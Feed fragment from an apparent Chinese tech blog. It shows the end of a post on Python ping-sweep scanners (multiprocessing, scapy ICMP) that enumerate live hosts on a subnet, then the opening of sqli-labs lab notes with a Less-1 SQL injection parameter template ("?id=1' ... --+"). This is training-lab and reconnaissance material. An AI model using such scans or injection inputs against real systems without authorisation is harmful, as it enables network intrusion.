&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">queue&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">multiprocessing&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Manager&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Queue&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">maxQueue&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">net&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ipaddress&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ip_network&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">network&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1"># 将网段解析为所有地址&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">pool&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">multiprocessing&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Pool&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">maxPool&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="n">maxPool&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="n">multiprocessing&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">cpu_count&lt;/span>&lt;span class="p">())&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">ip&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">net&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">pool&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">apply&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sacnFunc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">ip&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">queue&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">pool&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">close&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">pool&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">join&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">successful_ip_list&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">queue&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">empty&lt;/span>&lt;span class="p">():&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">host&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">queue&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">successful_ip_list&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">host&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nb">sorted&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">successful_ip_list&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="vm">__name__&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kn">import&lt;/span> &lt;span class="nn">time&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">start&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">time&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">time&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Start scanning ...&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">active_ip&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">scan&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;192.168.101.0/24&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ping&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Scan complete!&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;The hosts successfully scanned are:&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">ip&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">enumerate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">active_ip&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">: &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ip&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">A total of &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2"> addresses were successful!&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">active_ip&lt;/span>&lt;span class="p">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">end&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">time&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">time&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;This scan takes a total of &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2"> seconds.&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">end&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">start&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="2-linux">2. Linux
&lt;/h3>&lt;blockquote>
&lt;ul>
&lt;li>🈲 Windows!&lt;/li>
&lt;li>🈲 Windows!!&lt;/li>
&lt;li>🈲 Windows!!!&lt;/li>
&lt;li>不要试图在Windows环境下运行该程序!否则出事了本人概不负责!!!&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;span class="lnt">52
&lt;/span>&lt;span class="lnt">53
&lt;/span>&lt;span class="lnt">54
&lt;/span>&lt;span class="lnt">55
&lt;/span>&lt;span class="lnt">56
&lt;/span>&lt;span class="lnt">57
&lt;/span>&lt;span class="lnt">58
&lt;/span>&lt;span class="lnt">59
&lt;/span>&lt;span class="lnt">60
&lt;/span>&lt;span class="lnt">61
&lt;/span>&lt;span class="lnt">62
&lt;/span>&lt;span class="lnt">63
&lt;/span>&lt;span class="lnt">64
&lt;/span>&lt;span class="lnt">65
&lt;/span>&lt;span class="lnt">66
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">logging&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">ipaddress&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">multiprocessing&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">os&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">random&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">randint&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">scapy.layers.inet&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">IP&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ICMP&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">scapy.sendrecv&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">sr1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">logging&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">getLogger&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;scapy.runtime&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">setLevel&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">logging&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ERROR&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">ping&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">host&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> ping一个主机
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> :param host: 主机地址
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> :return:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Testing：&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">host&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">id_ip&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">randint&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">65535&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">id_ping&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">randint&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">65535&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">seq_ping&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">randint&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">65535&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">pkt&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">IP&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">dst&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nb">str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">host&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">ttl&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nb">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">id_ip&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="n">ICMP&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">id_ping&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">seq&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">seq_ping&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">/&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s2">&amp;#34;I&amp;#39;m a ping packet &amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">reply&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">sr1&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pkt&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">timeout&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">verbose&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">False&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">reply&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">scan&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">network&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">scanFunc&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;&amp;#34;&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> 对一个局域网进行扫描
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> :param network: 扫描一个局域网
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> :param scanFunc: 用到的扫描函数
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> :return: 返回
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> &amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">net&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ipaddress&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ip_network&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">network&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ip_processes&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">ip&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">net&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ip&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ip&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">process&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">multiprocessing&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Process&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">target&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">scanFunc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ip&lt;/span>&lt;span class="p">,))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">process&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">start&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ip_processes&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">ip&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">process&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">successful_ip_list&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">ip&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">process&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">ip_processes&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">items&lt;/span>&lt;span class="p">():&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">process&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">exitcode&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">3&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">successful_ip_list&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ip&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">process&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">terminate&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nb">sorted&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">successful_ip_list&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="vm">__name__&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kn">import&lt;/span> &lt;span class="nn">time&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">network&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">input&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Please enter the network segment to be scanned：&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">start&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">time&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">time&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Start scanning ...&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">active_ip&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">scan&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">network&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ping&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Scan complete!&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;The hosts successfully scanned are:&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ip&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">enumerate&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">active_ip&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">: &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">ip&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">A total of &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2"> addresses were successful!&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">active_ip&lt;/span>&lt;span class="p">)))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">end&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">time&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">time&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;This scan takes a total of &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2"> seconds.&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">end&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">start&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>sqli-labs 通关笔记</title><link>https://wlynxg.github.io/blog/p/sqli-labs-%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/</link><pubDate>Fri, 22 Aug 2025 17:34:52 +0800</pubDate><guid>https://wlynxg.github.io/blog/p/sqli-labs-%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/</guid><description>&lt;h1 id="sqli-labs-通关笔记">sqli-labs 通关笔记
&lt;/h1>&lt;h1 id="基础篇">基础篇
&lt;/h1>&lt;h3 id="less-1">Less-1
&lt;/h3>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>请求方式&lt;/th>
&lt;th>注入方式&lt;/th>
&lt;th>注入位置&lt;/th>
&lt;th>参数构造&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>GET&lt;/td>
&lt;td>报错回注&lt;/td>
&lt;td>url&lt;/td>
&lt;td>?id=1&amp;rsquo; 注入语句 &amp;ndash;+&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
